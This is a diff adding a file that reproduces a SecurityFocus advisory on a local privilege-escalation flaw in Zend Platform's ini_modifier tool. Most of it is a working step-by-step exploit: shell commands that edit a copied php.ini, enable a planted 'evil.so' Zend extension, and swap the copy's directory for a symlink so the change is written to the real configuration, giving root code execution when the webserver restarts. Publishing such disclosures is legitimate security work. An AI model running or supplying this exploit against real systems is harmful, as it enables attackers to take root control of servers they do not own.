@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/22802/info
+
+The Zend Platform is prone to an issue that may let local attackers modify the PHP configuration file ('php.ini'). This issue occurs because the application is installed with an 'ini_modifier' program that may be executed by local users and will bypass the authentication that is required by the application to change the configuration file.
+
+An attacker could add a malicious PHP extension to the configuration or otherwise tamper with PHP configuration directives. A successful exploit could grant the attacker elevated privileges on the computer.
+
+$ cd /tmp
+
+$ mkdir ini
+$ cd ini
+$ cp /usr/local/Zend/etc/php.ini .
+... now edit zend_gui_password in the copy to a MD5 of your choice and
+... REMEBER the old MD5
+$ cd ..
+$ /usr/local/Zend/sbin/ini_modifier -f /tmp/ini/php.ini -n
+Password:
+(ini_modifier) help
+modify entry - Modifies an entry.
+switch extension - Enables or disables an extension.
+switch zend_extension - Enables or disables a Zend extension.
+help - Shows this help.
+write - Writes the changes.
+quit - Quits the program.
+(ini_modifier) switch zend_extension /var/www/upload/evil.so on
+(ini_modifier) modify entry Zend zend_gui_password OLDMD5
+(ini_modifier)
+
+In a parallel session you now perform the following:
+
+$ cd /tmp
+$ mv ini ini.bak
+$ ln -s /usr/local/Zend/etc ini
+
+And continue to edit the ini file:
+
+(ini_modifier) write
+(ini_modifier) quit
+
+$ cat /usr/local/Zend/etc/php.ini
+[PHP]
+zend_extension=/var/www/upload/evil.so
+...
+zend_gui_password=OLDMD5
+
+The next time the webserver is restarted, the injected malicious Zend Extension will be loaded and executed with root permissions. 
